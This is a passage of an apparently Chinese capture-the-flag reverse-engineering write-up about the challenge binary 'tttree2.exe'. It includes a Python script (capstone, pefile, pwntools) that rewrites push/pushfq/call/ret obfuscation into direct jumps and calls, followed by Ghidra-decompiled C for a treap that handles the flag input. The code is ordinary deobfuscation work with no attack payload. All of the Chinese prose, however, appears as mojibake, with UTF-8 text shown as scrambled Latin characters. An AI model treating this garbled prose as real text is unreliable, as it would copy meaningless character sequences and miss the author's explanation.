è¿™ä¸ªpop raxå°†å¼¹å‡ºå‰ä¸€æ¡æŒ‡ä»¤ä¸­çš„è°ƒç”¨æ‰€æ¨é€çš„è¿”å›åœ°å€ã€‚</p><p>æ‰€ä»¥è¿™æ•´ä¸ªæ¨¡å¼åŸºæœ¬ä¸Šç­‰åŒäºæŠŠripç›¸å¯¹åœ°å€æ¨åˆ°å †æ ˆä¸­ï¼ˆraxå’Œflagså°†è¢«æ¢å¤ï¼‰æœ€åRETå°†è·³è½¬åˆ°å®ƒã€‚
pushfqå’Œpopfdçš„ä½¿ç”¨å¯èƒ½æ˜¯ä¸ºäº†ä½¿æ··æ·†ä¸ä¼šæ‰°ä¹±x86çš„æ ‡å¿—ã€‚
ä¸è¿‡å¥½åœ¨ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯è¿™ç§æ¨¡å¼ï¼Œæ‰€ä»¥æˆ‘å†™äº†ä¸€ä¸ªå»æ··æ·†çš„è„šæœ¬ï¼Œç”¨python-capstoneã€pefileå’Œpwn.asmæ¥ä¿®è¡¥äºŒè¿›åˆ¶ã€‚
æœ‰ä¸¤ç§æƒ…å†µã€‚
â‘ :æŠŠripçš„ç›¸å¯¹åœ°å€æ¨åˆ°å †æ ˆï¼Œç„¶åRET ->ç›¸å½“äºJMP
â‘¡:æ¨é€ä¸¤ä¸ªripç›¸å¯¹åœ°å€åˆ°å †æ ˆï¼Œç„¶åRET ->æˆ‘æŠŠè¿™è§£é‡Šä¸ºå¦‚æœCALLå‘ç”Ÿåœ¨ç¬¬äºŒä¸ªæ¨é€çš„å€¼ä¸Šï¼Œè€Œè°ƒç”¨æ‰€æ¨é€çš„è¿”å›åœ°å€æ˜¯ç¬¬ä¸€ä¸ªæ¨é€å€¼ã€‚
æ‰€ä»¥æˆ‘æŠŠè¿™ä¸ªæ¨¡å¼å¤§è‡´å˜æˆäº†CALL $secondå’ŒJMP $firstã€‚
ä¸è¿‡pwnå¾—asmçœŸçš„ç‰¹åˆ«æ…¢
Patch exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>capstone</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>capstone.x86</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pwn</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pefile</span>
</span></span><span class=line><span class=cl><span class=n>md</span> <span class=o>=</span> <span class=n>Cs</span><span class=p>(</span><span class=n>CS_ARCH_X86</span><span class=p>,</span> <span class=n>CS_MODE_64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span> <span class=c1># Default architecture is i386</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>md</span><span class=o>.</span><span class=n>detail</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl><span class=c1># for reference</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x0 [50]: push rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x1 [50]: push rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x2 [9c]: pushfq &gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x3 [e800000000]: call 8&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x8 [58]: pop rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x9 [480559d7ffff]: add rax, -0x28a7&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0xf [4889442410]: mov qword ptr [rsp + 0x10], rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x14 [9d]: popfq &gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x15 [58]: pop rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x16 [50]: push rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x17 [50]: push rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x18 [9c]: pushfq &gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x19 [e800000000]: call 0x1e&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x1e [58]: pop rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x1f [48050781ffff]: add rax, -0x7ef9&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x25 [4889442410]: mov qword ptr [rsp + 0x10], rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x2a [9d]: popfq &gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x2b [58]: pop rax&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># &lt;CsInsn 0x2c [c3]: ret &gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>patch</span><span class=p>(</span><span class=n>chunk</span><span class=p>:</span> <span class=nb>bytearray</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytearray</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pattern</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x50\x50\x9c</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>off</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>chunk</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>pattern</span><span class=p>)]</span> <span class=o>==</span> <span class=n>pattern</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>off</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(chunk[off:off+16])</span>
</span></span><span class=line><span class=cl>            <span class=n>inss</span> <span class=o>=</span> <span class=n>md</span><span class=o>.</span><span class=n>disasm</span><span class=p>(</span><span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=mh>0x40</span><span class=p>],</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(inss)</span>
</span></span><span class=line><span class=cl>            <span class=n>adr_v</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>inss</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=c1># print(i.address)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>mnemonic</span> <span class=o>==</span> <span class=s1>&#39;add&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>i</span><span class=o>.</span><span class=n>address</span> <span class=ow>in</span> <span class=p>[</span><span class=mh>0x9</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>i</span><span class=o>.</span><span class=n>mnemonic</span> <span class=o>==</span> <span class=s1>&#39;add&#39;</span>
</span></span><span class=line><span class=cl>                    <span class=n>adr_v</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>operands</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>value</span><span class=o>.</span><span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=c1># print(hex(add_v))</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>address</span> <span class=o>==</span> <span class=mh>0x16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>mnemonic</span> <span class=o>==</span> <span class=s1>&#39;ret&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>adr_v</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>                        <span class=n>target</span> <span class=o>=</span> <span class=n>adr_v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=c1># print(hex(target+off))</span>
</span></span><span class=line><span class=cl>                        <span class=n>n</span> <span class=o>=</span> <span class=n>i</span><span class=o>.</span><span class=n>address</span><span class=o>+</span><span class=n>i</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>                        <span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=n>n</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=o>*</span><span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=c1># print(pwn.p32(target), jins)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>jins</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;jmp $+</span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>jins</span><span class=p>)]</span><span class=o>=</span><span class=n>jins</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>assert</span> <span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=o>+</span><span class=mh>0x16</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=mh>0x16</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>pattern</span><span class=p>)]</span> <span class=o>==</span> <span class=n>pattern</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>address</span> <span class=o>==</span> <span class=mh>0x16</span><span class=o>*</span><span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>adr_v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>i</span><span class=o>.</span><span class=n>mnemonic</span> <span class=o>==</span> <span class=s1>&#39;ret&#39;</span>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>adr_v</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=n>call_target</span> <span class=o>=</span> <span class=n>adr_v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1e</span>
</span></span><span class=line><span class=cl>                    <span class=n>jmp_target</span> <span class=o>=</span> <span class=n>adr_v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>                    <span class=n>shc</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>                            call $+</span><span class=si>{</span><span class=n>call_target</span><span class=si>}</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>                            &#39;&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>shj</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>                            jmp $+</span><span class=si>{</span><span class=n>jmp_target</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>shc</span><span class=p>)</span><span class=si>}</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>                            &#39;&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>n</span> <span class=o>=</span> <span class=n>i</span><span class=o>.</span><span class=n>address</span><span class=o>+</span><span class=n>i</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>                    <span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=n>n</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=o>*</span><span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>jins</span> <span class=o>=</span> <span class=n>shc</span> <span class=o>+</span> <span class=n>shj</span>
</span></span><span class=line><span class=cl>                    <span class=n>chunk</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>jins</span><span class=p>)]</span><span class=o>=</span><span class=n>jins</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pe</span> <span class=o>=</span> <span class=n>pefile</span><span class=o>.</span><span class=n>PE</span><span class=p>(</span><span class=s2>&#34;tttree2.exe&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;tttree2.exe&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>pe</span><span class=o>.</span><span class=n>sections</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>IMAGE_SCN_MEM_EXECUTE</span><span class=p>):</span> <span class=c1># only patch executable regions</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>PointerToRawData</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>l</span> <span class=o>+</span> <span class=n>s</span><span class=o>.</span><span class=n>SizeOfRawData</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;offs:&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>l</span><span class=p>),</span> <span class=nb>hex</span><span class=p>(</span><span class=n>r</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span><span class=p>[</span><span class=n>l</span><span class=p>:</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=n>patch</span><span class=p>(</span><span class=n>c</span><span class=p>[</span><span class=n>l</span><span class=p>:</span><span class=n>r</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;patched.exe&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¹‹åå°±å¾—åˆ°äº†patchä¹‹åçš„ç¨‹åº ä½†æ˜¯ä»ç„¶ä¸å¤Ÿå®Œå…¨ ä½†æ˜¯ghidraè¿™ä¸ªåæ±‡ç¼–å·¥å…·å¾ˆå¼ºå¤§ï¼Œå®Œå…¨å¯ä»¥åç¼–è¯‘
æ‰€ä»¥æˆ‘ä»¬å¾—åˆ°ä¸»è¦ç¨‹åºé€»è¾‘</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=nf>rng</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>cur_rng</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)(((</span><span class=n>longlong</span><span class=p>)</span><span class=n>cur_rng</span> <span class=o>*</span> <span class=mh>0xbc8f</span><span class=p>)</span> <span class=o>%</span> <span class=mh>0x7fffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>cur_rng</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>insert</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=n>idx</span><span class=p>,</span><span class=kt>int</span> <span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>rnd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>node_cnt</span> <span class=o>=</span> <span class=n>node_cnt</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>idx</span> <span class=o>=</span> <span class=n>node_cnt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>cnt</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>size</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>value</span> <span class=o>=</span> <span class=n>v</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>some_data</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>flag_input</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span> <span class=o>+</span> <span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>rnd</span> <span class=o>=</span> <span class=nf>rng</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>arr</span><span class=p>[</span><span class=n>arr_idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>rnd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>priority</span> <span class=o>=</span> <span class=n>arr</span><span class=p>[</span><span class=n>arr_idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>arr_idx</span> <span class=o>=</span> <span class=n>arr_idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>size</span> <span class=o>=</span> <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>size</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>value</span> <span class=o>==</span> <span class=n>v</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>cnt</span> <span class=o>=</span> <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>cnt</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>value</span> <span class=o>&lt;</span> <span class=n>v</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>insert</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>R</span><span class=p>,</span><span class=n>v</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>nodes</span><span class=p>[</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>R</span><span class=p>].</span><span class=n>priority</span> <span class=o>&lt;</span> <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>priority</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>rot_somehow</span><span class=p>(</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>insert</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>L</span><span class=p>,</span><span class=n>v</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>nodes</span><span class=p>[</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>L</span><span class=p>].</span><span class=n>priority</span> <span class=o>&lt;</span> <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>priority</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>rot_otherhow</span><span class=p>(</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
